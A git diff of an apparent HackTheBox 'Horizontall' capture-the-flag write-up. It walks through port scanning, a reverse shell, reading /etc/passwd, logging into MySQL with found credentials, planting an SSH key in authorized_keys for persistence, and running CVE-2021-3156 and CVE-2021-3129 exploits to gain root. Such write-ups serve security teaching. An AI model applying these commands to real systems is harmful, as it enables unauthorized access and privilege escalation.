@@ -18,11 +18,9 @@ tags:
 
 ---
 
-## Scanning Port 80 (horizontall.htb)  
+## Initial Port Scan  
 
-Let's go ahead and run our port scanner.    
-
-### NMap Results  
+Let's go ahead and run our port scanner.  
 
 ```bash
 $ sudo nmap -sS -A -sV -T5 -p- 10.10.11.105 | tee nmap.log
@@ -46,6 +44,8 @@ If we don't do this, the webpage will not show up correctly in our browser.
 When we visit it, it seems like a pretty boring, generic pre-made template-style page for these things :  
 
 ![Home Page](/assets/images/HTB/horizontall/homepage.png)  
+
+## Scanning Port 80 (horizontall.htb)  
 
 ### Fuzz Faster U Fool (FFUF) Results  
 
@@ -251,7 +251,7 @@ connect to [10.10.14.9] from (UNKNOWN) [10.10.11.105] 47746
 /bin/sh: 0: can't access tty; job control turned off
 
 #Spawn a shell:
-$ python -c 'import pty; pty.spawn("/bin/sh")'
+$ python3 -c 'import pty; pty.spawn("/bin/sh")'
 $ id
 
 uid=1001(strapi) gid=1001(strapi) groups=1001(strapi)
@@ -271,7 +271,14 @@ cat /home/developer/user.txt
 
 Now we need to try to escalate our user (strapi) privileges. Let's start by getting an idea of who/what all is on this system.  
 
-### Standard Enumeration  
+Additionally, I went ahead and started linpeas.sh to detect potential priv-esc routes.  
+
+### Users  
+
+It looks like there are three main users:  
+- root  
+- strapi  
+- developer  
 
 ```bash
 $cat /etc/passwd
@@ -310,9 +317,280 @@ mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
 strapi:x:1001:1001::/opt/strapi:/bin/sh
 ```  
 
+I tried to switch from strapi to developer and root by not supplying a password, or supplying their username as a password but failed.  
+
+### Linux Kernel Exploit (Unintended Solution) 
+
+Note, I discovered an outdated Linux kernel exploit, but I do not think this was the intended exploit path for this box (many of the boxes I have done lately are vulnerable in this way, because the boxes were created before this CVE was released).  
+
+![Linux Kernel/Polkit Exploit](/assets/images/HTB/horizontall/polkit.png)  
+
 ```bash
 $uname -a
 Linux horizontall 4.15.0-154-generic #161-Ubuntu SMP Fri Jul 30 13:04:17 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 ```  
 
+### MySQL  
 
+My linpeas script returned a bunch of information on the active mysql service running on 127.0.0.1:3306. I went through many config/other files looking for credentials and such, but LinPeas found one for **developer** :  
+
+![Linpeas Detects mysql Creds](/assets/images/HTB/horizontall/mysql-creds.png)  
+
+So I went ahead and logged in :  
+
+```bash
+developer:#J!:F9Zt2u
+
+$mysql -u developer -p
+$#J!:F9Zt2u
+```  
+
+There are 5 databases and I scoured a lot of the tables for sensitive information. I found what I think are SHA-1 MySQL credentials, but couldn't crack them in john :  
+
+```bash
+$show databases;
+
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| strapi             |
+| sys                |
++--------------------+
+
+$use mysql;
+$show tables;
+
++---------------------------+
+| Tables_in_mysql           |
++---------------------------+
+| columns_priv              |
+| db                        |
+| engine_cost               |
+| event                     |
+| func                      |
+| general_log               |
+| gtid_executed             |
+| help_category             |
+| help_keyword              |
+| help_relation             |
+| help_topic                |
+| innodb_index_stats        |
+| innodb_table_stats        |
+| ndb_binlog_index          |
+| plugin                    |
+| proc                      |
+| procs_priv                |
+| proxies_priv              |
+| server_cost               |
+| servers                   |
+| slave_master_info         |
+| slave_relay_log_info      |
+| slave_worker_info         |
+| slow_log                  |
+| tables_priv               |
+| time_zone                 |
+| time_zone_leap_second     |
+| time_zone_name            |
+| time_zone_transition      |
+| time_zone_transition_type |
+| user                      |
++---------------------------+
+
+$select * from user;
+```  
+
+![MYSQL Hash'd Creds](/assets/images/HTB/horizontall/mysql-encryptedPasses.png)  
+
+JohnTheRipper :  
+
+```bash
+#No Results:
+$john --format:RAW-SHA1 --wordlist:/usr/share/wordlists/rockyou.txt testing.txt
+
+#Took Too Long:
+$john --format=mysql-sha1 testing.txt
+```  
+
+### Sudo Exploit - Priv. Esc.  
+
+```bash
+$sudo -V
+
+Sudo version 1.8.21p2
+Sudoers policy plugin version 1.8.21p2
+Sudoers file grammar version 46
+Sudoers I/O plugin version 1.8.21p2
+```  
+
+Checking into this version, it seems vulnerable to CVE-2021-3156 Privilege Escalation / Heap Overflow.  
+
+I did the legwork of downloading the exploit, modifying it and putting it on the vulnerable machine.  
+
+Vulnerability: Sudo legacy versions from 1.8.2 to 1.8.31p2, stable versions from 1.9.0 to 1.9.5p1.  
+
+I downloaded a Python3-type exploit file with **searchsploit -m 49421**, which invokes a BoF and replaces a requested file with a supplied file. (i.e. passwd file that has root:root to replace /etc/passwd).  
+
+However, when I went to run it I was getting an error. Looking online for answers, the GitHub repository for the code states that you need the current user's password in order to use the exploit because the /etc/passwd file must have been updated since the latest boot...  
+
+Sad day. We don't have a user password.  
+
+### SSH  
+
+There was a lot going on with SSH: 'test' id_rsa files for the web to login with, for instance. But also, the Strapi user has an **.ssh** folder in his home directory (**/opt/strapi/**).  
+
+There is an **authorized_keys** file (Stores Public SSH Keys) in here with a public key but none for strapi@horizontall, so I made a new SSH key-pair :  
+
+```bash
+$ssh-keygen
+
+Generating public/private rsa key pair.
+Enter file in which to save the key (/opt/strapi/.ssh/id_rsa): /opt/strapi/.ssh/id_rsa
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /opt/strapi/.ssh/id_rsa.
+Your public key has been saved in /opt/strapi/.ssh/id_rsa.pub.
+```  
+
+Next step is to add the public key to the /.ssh/authorized_keys file :  
+
+```bash
+$ cd ~/.ssh && cat id_rsa.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC4fQpBKYdBb2TUU7R0WlUFT9VvCZm7or89qfB2e19WJ1GiGqwH8hQcu4usJNBYKx3lx
++hKfG8PfJpnPLpM55WiU575MKB4bydDLWW4+5uznM8cbLQRtyjM9PuURVF4OGnGlv5vvMfkJAPb0ucTx4zRe0Os55a5CXU5w1Nsg0RqDb
+HX7PagIx4XvUGko2Mh4UCzjn94ZanaTwl9d3QuBCppaWwjiQkHo+srMGQtdufNZS43JNRAqBPvu0wZlIc7ndhCn2wg+xtMxHQUdXo7GRh
+B0fRGpll9UdzetvJvTh4sM7+H3gbAi+Ilfh0NY1yR3sSZ4QnwUvxhkMRmc9lM3A+P strapi@horizontall
+
+$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC4fQpBKYdBb2TUU7R0WlUFT9VvCZm7or89qfB2e19WJ1GiGqwH8hQcu4usJ
+NBYKx3lx+hKfG8PfJpnPLpM55WiU575MKB4bydDLWW4+5uznM8cbLQRtyjM9PuURVF4OGnGlv5vvMfkJAPb0ucTx4zRe0Os55a5CXU5w1
+Nsg0RqDbHX7PagIx4XvUGko2Mh4UCzjn94ZanaTwl9d3QuBCppaWwjiQkHo+srMGQtdufNZS43JNRAqBPvu0wZlIc7ndhCn2wg+xtMxHQ
+UdXo7GRhB0fRGpll9UdzetvJvTh4sM7+H3gbAi+Ilfh0NY1yR3sSZ4QnwUvxhkMRmc9lM3A+P strapi@horizontall" >> authorized_keys
+```  
+
+Now I can login via SSH by copying the id_rsa key (private key) to my local Kali machine and supplying it via **-i**.  
+
+```bash
+$ ssh strapi@10.10.11.105 -i id_rsa
+
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-154-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu May 19 06:02:42 UTC 2022
+
+  System load:  0.16              Processes:           202
+  Usage of /:   82.4% of 4.85GB   Users logged in:     1
+  Memory usage: 30%               IP address for eth0: 10.10.11.105
+```  
+
+### Open-Ports  
+
+Another thing I hadn't fully investigated by this point were the open ports on the internal network (127.0.0.1) :  
+
+![Open Ports Linpeas](/assets/images/HTB/horizontall/open-ports.png)  
+
+Additional to the ports we already knew about from NMap (80/22), we also see :  
+- 3306 : MySQL Server (enumerated in databases)  
+- 1337 : Our Current Shell Connection
+- 8000 : ???
+
+I tried to curl 127.0.0.1:3306 and got some weird response about one of the encrypted passwords and packets getting mixed up :  
+
+```bash
+$ curl 127.0.0.1:3306 --output 3306.log
+$ cat 3306.log
+
+5.7.35-0ubuntu0.18.04.1c#[za���galZg
+                                    o6qmysql_native_password!��#08S01Got packets out of order$
+```  
+
+Then, I curled 127.0.0.1:8000 :  
+
+```bash
+$ curl 127.0.0.1:8000 --output 8000.log
+$ cat 8000.log
+
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>Laravel</title>
+        <!-- Fonts -->
+        <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700&display=swap" rel="stylesheet">
+		
+		...
+		
+		<div class="ml-4 text-center text-sm text-gray-500 sm:text-right sm:ml-0">
+			Laravel v8 (PHP v7.4.18)
+`		</div>		
+```  
+
+## Privilege Escalation - Laravel  
+
+Okay, so we have Laravel v8 running and have identified a PHP version on this 127.0.0.1:8000.  
+
+Since we already have a means of logging in via SSH, I ended my current session and logged in with the port-forwarding option (**-L**) :  
+
+You supply the remote port first, then the remote IP that hosts it, then the local port you want to view it on :  
+
+> ssh -L LOCAL-PORT:REMOTE-ADDR:REMOTE-PORT
+
+```bash
+$ ssh strapi@10.10.11.105 -i id_rsa -L 8001:127.0.0.1:8000   
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-154-generic x86_64)
+```  
+
+Now we can view it by opening a browser on our local Kali machine and typing : **localhost:8001**  
+
+![Laravel Site](/assets/images/HTB/horizontall/laravel.png)  
+
+### CVE-2021-3129  
+
+Searching for Laravel exploits reveals an RCE via insecure file_get_contents() and file_put_contents usage for Laravel < 8.4.2 :  
+
+![CVE Details](/assets/images/HTB/horizontall/laravel-exploit.png)  
+
+After downloading and viewing the Python-based exploit, I am almost ready to run it. My only problem is I am missing the log file for Laravel.  
+
+The usage is as follows :  
+
+> python exploit.py http://localhost:8001 /laravel/something.log 'command'  
+
+This would execute some command and return the response.  
+
+However, we don't know where the log file is and I can't locate it in our current session. So, I am convinced our user Strapi doesn't have access to the folder it is in.  
+
+Doing some more internet research, I discovered that the answer was to try options from a list of Gadgetchains [here](https://github.com/zhzyker/CVE-2021-3129).  
+
+The idea is that the exploit uses an RCE class that is defined inside a PHP Gadgetchain like so :  
+
+[GadgetChains](/assets/images/HTB/horizontall/gadgetchains.png)  
+
+But each one I try fails. This exploit code does not work for us. If we try using a better one online, from say, [Github]()
+
+Saving this exploit.py onto my local system, we can try again :  
+
+```bash
+$ python3 exploit.py http://localhost:8001 Monolog/RCE1 id
+[i] Trying to clear logs
+[+] Logs cleared
+[+] PHPGGC found. Generating payload and deploy it to the target
+[+] Successfully converted logs to PHAR
+[+] PHAR deserialized. Exploited
+
+uid=0(root) gid=0(root) groups=0(root)
+
+[i] Trying to clear logs
+[+] Logs cleared
+```  
+
+Success. So, let's go ahead and grab the root flag :  
+
+![Root Flag](/assets/images/HTB/horizontall/root.png)  
+
+> Note: Other PHP Gadgetchain Classes can be used to execute this payload as well. For example, I also grabbed root.txt with Monolog/RCE2. Refer back to [here](https://github.com/zhzyker/CVE-2021-3129) for more information on these gadgetchain classes.  
